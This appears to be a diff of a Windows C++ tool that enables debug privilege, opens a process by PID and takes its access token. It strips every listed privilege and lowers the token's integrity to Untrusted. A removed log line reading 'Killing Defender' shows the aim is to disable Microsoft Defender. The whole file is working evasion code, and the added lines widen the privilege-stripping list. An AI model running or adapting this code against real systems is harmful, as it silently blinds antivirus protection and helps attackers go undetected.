@@ -1,4 +1,3 @@
-
 #include <Windows.h>
 #include <stdio.h>
 #include <iostream>
@@ -7,6 +6,8 @@
 #include <conio.h>
 
 
+
+#define SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME TEXT("SeDelegateSessionUserImpersonatePrivilege")
 bool EnableDebugPrivilege()
 {
     HANDLE hToken;
@@ -15,13 +16,11 @@ bool EnableDebugPrivilege()
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
     {
         return   FALSE;
-       
     }
     if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue))
     {
         CloseHandle(hToken);
         return false;
-       
     }
     tkp.PrivilegeCount = 1;
     tkp.Privileges[0].Luid = sedebugnameValue;
@@ -30,48 +29,27 @@ bool EnableDebugPrivilege()
     {
         CloseHandle(hToken);
         return false;
-        
     }
-   
     return true;
 }
 
-int getpid(LPCWSTR procname) {
 
-    DWORD procPID = 0;
-    LPCWSTR processName = L"";
-    PROCESSENTRY32 processEntry = {};
-    processEntry.dwSize = sizeof(PROCESSENTRY32);
-
-
-    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, procPID);
-    if (Process32First(snapshot, &processEntry))
-    {
-        while (_wcsicmp(processName, procname) != 0)
-        {
-            Process32Next(snapshot, &processEntry);
-            
-            procPID = processEntry.th32ProcessID;
-        }
-        printf("[+] Got target proc PID: %d\n", procPID);
-    }
-
-    return procPID;
-}
 
 BOOL SetPrivilege(
-    HANDLE hToken,          
-    LPCTSTR lpszPrivilege,  
-    BOOL bEnablePrivilege   
+    HANDLE hToken,          // access token handle
+    LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
+    BOOL bEnablePrivilege   // to enable or disable privilege
 )
 {
     TOKEN_PRIVILEGES tp;
     LUID luid;
 
+    
+
     if (!LookupPrivilegeValue(
-        NULL,            
-        lpszPrivilege,  
-        &luid))        
+        NULL,            // lookup privilege on local system
+        lpszPrivilege,   // privilege to lookup 
+        &luid))        // receives LUID of privilege
     {
         printf("LookupPrivilegeValue error: %u\n", GetLastError());
         return FALSE;
@@ -83,7 +61,6 @@ BOOL SetPrivilege(
         tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;
     else
         tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;
-
 
 
     if (!AdjustTokenPrivileges(
@@ -109,41 +86,39 @@ BOOL SetPrivilege(
 }
 
 
-int main(int argc, char** argv)
+int main()
 {
-
     LUID sedebugnameValue;
     EnableDebugPrivilege();
 
+    
 
-    DWORD pid ;
-    std::cout << "ENTER PID OF THE PROCESS -> ";
-    std::cin >> pid; 
+    
+    int pid;
+    std::cin >> pid;
 
 
     printf("PID %d\n", pid);
-	printf("[*] Killing Defender...\n");
-   
+    
 
 
-	HANDLE phandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ , true, pid);
+    
+    HANDLE phandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
 
+    if (phandle != INVALID_HANDLE_VALUE) {
 
-	if (phandle != INVALID_HANDLE_VALUE) {
-
-		printf("[*] Opened Target Handle\n");
-	}
+        printf("[*] Opened Target Handle\n");
+    }
     else {
         printf("[-] Failed to open Process Handle\n");
     }
 
-   printf("%p\n", phandle);
-  
+   
+
     HANDLE ptoken;
 
-    BOOL token = OpenProcessToken(phandle,TOKEN_ALL_ACCESS, &ptoken);
-    printf("OpenProcessToken error: %u\n", GetLastError());
-     std::cout  << token << std::endl;
+    BOOL token = OpenProcessToken(phandle, TOKEN_ALL_ACCESS, &ptoken);
+
     if (token) {
         printf("[*] Opened Target Token Handle\n");
     }
@@ -155,7 +130,7 @@ int main(int argc, char** argv)
 
 
     TOKEN_PRIVILEGES tkp;
-    
+
     tkp.PrivilegeCount = 1;
     tkp.Privileges[0].Luid = sedebugnameValue;
     tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
@@ -163,28 +138,52 @@ int main(int argc, char** argv)
     if (!AdjustTokenPrivileges(ptoken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
 
         printf("[-] Failed to Adjust Token's Privileges\n");
-        //return 0;
+        
     }
 
-    
-   
-    SetPrivilege(ptoken, SE_DEBUG_NAME, TRUE);
-    SetPrivilege(ptoken, SE_CHANGE_NOTIFY_NAME, TRUE);
-    SetPrivilege(ptoken, SE_TCB_NAME, TRUE);
-    SetPrivilege(ptoken, SE_IMPERSONATE_NAME, TRUE);
-    SetPrivilege(ptoken, SE_LOAD_DRIVER_NAME, TRUE);
-    SetPrivilege(ptoken, SE_RESTORE_NAME, TRUE);
-    SetPrivilege(ptoken, SE_BACKUP_NAME, TRUE);
-    SetPrivilege(ptoken, SE_SECURITY_NAME, TRUE);
-    SetPrivilege(ptoken, SE_SYSTEM_ENVIRONMENT_NAME, TRUE);
-    SetPrivilege(ptoken, SE_INCREASE_QUOTA_NAME, TRUE);
-    SetPrivilege(ptoken, SE_TAKE_OWNERSHIP_NAME, TRUE);
-    SetPrivilege(ptoken, SE_INC_BASE_PRIORITY_NAME, TRUE);
-    SetPrivilege(ptoken, SE_SHUTDOWN_NAME, TRUE);
-    SetPrivilege(ptoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);
-    SetPrivilege(ptoken, SE_TIME_ZONE_NAME, TRUE);
 
-    printf("[*] Removed All Privileges\n");
+
+    // ALL PRIV
+    printf("[*]Removing All privileges\n");
+    SetPrivilege(ptoken, SE_CREATE_TOKEN_NAME, TRUE);
+    SetPrivilege(ptoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);
+    SetPrivilege(ptoken, SE_LOCK_MEMORY_NAME, TRUE);
+    SetPrivilege(ptoken, SE_INCREASE_QUOTA_NAME, TRUE);
+    SetPrivilege(ptoken, SE_UNSOLICITED_INPUT_NAME, TRUE);
+    SetPrivilege(ptoken, SE_MACHINE_ACCOUNT_NAME, TRUE);
+    SetPrivilege(ptoken, SE_TCB_NAME, TRUE);
+    SetPrivilege(ptoken, SE_SECURITY_NAME, TRUE);
+    SetPrivilege(ptoken, SE_TAKE_OWNERSHIP_NAME, TRUE);
+    SetPrivilege(ptoken, SE_LOAD_DRIVER_NAME, TRUE);
+    SetPrivilege(ptoken, SE_SYSTEM_PROFILE_NAME, TRUE);
+    SetPrivilege(ptoken, SE_SYSTEMTIME_NAME, TRUE);
+    SetPrivilege(ptoken, SE_PROF_SINGLE_PROCESS_NAME, TRUE);
+    SetPrivilege(ptoken, SE_INC_BASE_PRIORITY_NAME, TRUE);
+    SetPrivilege(ptoken, SE_CREATE_PAGEFILE_NAME, TRUE);
+    SetPrivilege(ptoken, SE_CREATE_PERMANENT_NAME, TRUE);
+    SetPrivilege(ptoken, SE_BACKUP_NAME, TRUE);
+    SetPrivilege(ptoken, SE_RESTORE_NAME, TRUE);
+    SetPrivilege(ptoken, SE_SHUTDOWN_NAME, TRUE);
+    SetPrivilege(ptoken, SE_DEBUG_NAME, TRUE);
+    SetPrivilege(ptoken, SE_AUDIT_NAME, TRUE);
+    SetPrivilege(ptoken, SE_SYSTEM_ENVIRONMENT_NAME, TRUE);
+    SetPrivilege(ptoken, SE_CHANGE_NOTIFY_NAME, TRUE);
+    SetPrivilege(ptoken, SE_REMOTE_SHUTDOWN_NAME, TRUE);
+    SetPrivilege(ptoken, SE_UNDOCK_NAME, TRUE);
+    SetPrivilege(ptoken, SE_SYNC_AGENT_NAME, TRUE);
+    SetPrivilege(ptoken, SE_ENABLE_DELEGATION_NAME, TRUE);
+    SetPrivilege(ptoken, SE_MANAGE_VOLUME_NAME, TRUE);
+    SetPrivilege(ptoken, SE_IMPERSONATE_NAME, TRUE);
+    SetPrivilege(ptoken, SE_CREATE_GLOBAL_NAME, TRUE);
+    SetPrivilege(ptoken, SE_TRUSTED_CREDMAN_ACCESS_NAME, TRUE);
+    SetPrivilege(ptoken, SE_RELABEL_NAME, TRUE);
+    SetPrivilege(ptoken, SE_INC_WORKING_SET_NAME, TRUE);
+    SetPrivilege(ptoken, SE_TIME_ZONE_NAME, TRUE);
+    SetPrivilege(ptoken, SE_CREATE_SYMBOLIC_LINK_NAME, TRUE);
+    SetPrivilege(ptoken, SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME, TRUE);
+
+
+    printf("[*]  All Privileges are removed\n");
 
 
     DWORD integrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;
@@ -207,9 +206,10 @@ int main(int argc, char** argv)
         sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(&integrityLevelSid)))
     {
         printf("SetTokenInformation failed\n");
-    }else{
+    }
+    else {
 
-    printf("[*] Token Integrity set to Untrusted\n");
+        printf("[*] Token Integrity set to Untrusted\n");
     }
 
     CloseHandle(ptoken);
